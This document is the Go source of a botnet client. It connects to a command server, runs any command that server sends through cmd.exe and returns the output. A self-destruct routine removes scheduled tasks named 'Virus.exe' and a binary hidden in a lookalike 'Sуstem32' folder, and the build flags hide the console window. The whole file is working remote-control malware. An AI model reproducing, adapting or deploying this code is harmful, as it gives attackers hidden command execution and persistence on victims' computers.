package main

/*
go build -ldflags "-s -H windowsgui" -o clientgui.exe .\botnet\botnet_files\client.go
*/
import (
	"bufio"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/osogi/botnet"
)

const server_ip string = "127.0.0.1:6666"

var live bool = false

func get_pac_client(conn net.Conn, seed int64) ([]byte, int64) {
	return botnet.GetPac(conn, seed, 1024*1024*1024*60, botnet.ClientSign)
}
func send_pac_client(conn net.Conn, message []byte, seed int64) int64 {

	return botnet.SendPac(conn, message, seed, botnet.ClientSign)
}

func main() {
	var conn net.Conn
	seed := int64(0)
	message := make([]byte, 0)
	for {
		if !live {
			conect, err := net.Dial("tcp", server_ip)
			if err == nil {
				buf, _ := bufio.NewReader(conect).ReadString('\n')
				if buf == "Live\n" {
					buf := make([]byte, 16)
					conn = conect
					rand.Seed(time.Now().Unix())
					sm_rand := rand.Int63()
					binary.PutVarint(buf, sm_rand)
					conn.Write(buf)
					_, _ = conn.Read(buf)
					checker, _ := binary.Varint(buf)
					if checker == botnet.ClientSign(sm_rand, make([]byte, 0), 0) {
						seed = checker
						conn.Write([]byte("Ready"))
						live = true
						fmt.Println("Сonnection established")
					} else {
						conn.Close()
					}
				} else {
					conn.Close()
				}

			} else {
				fmt.Println(err)
				time.Sleep(5 * time.Second)
			}
		} else {
			message, seed = get_pac_client(conn, seed)
			switch string(message[0:2]) {
			case "\xc3\xde":
				cmd := exec.Command("cmd.exe", "/C", string(message[2:]))
				output, err := cmd.CombinedOutput()
				fmt.Println(string(output))
				fmt.Println(output)
				if err != nil {
					fmt.Println(err)
				}
				if len(output) == 0 {
					output = []byte("NULL\n")
				}
				seed = send_pac_client(conn, output, seed)
			case "\xde\xad":
				seed = send_pac_client(conn, []byte("Okay, I will die\n"), seed)
				cmd := exec.Command("powershell", "/C", "timeout /t 10; rm -path \"C:\\Windows\\System32\\infestor.exe\"; schtasks /delete /tn \"Virus.exe\" /f;schtasks /delete /tn \"Virus1.exe\" /f; ATTRIB -H -S \"C:\\Windows\\Sуstem32\"; rm -r -path \"C:\\Windows\\Sуstem32\"; ATTRIB +H +S \"C:\\Windows\\Sуstem32\"")
				_, _ = cmd.CombinedOutput()
				os.Exit(0)
			case "\xec\x40":
				seed = send_pac_client(conn, message[2:], seed)
			default:
				conn.Close()
				live = false
				fmt.Print("Head error ")
				fmt.Println(message[0:2])
			}
		}
	}

}
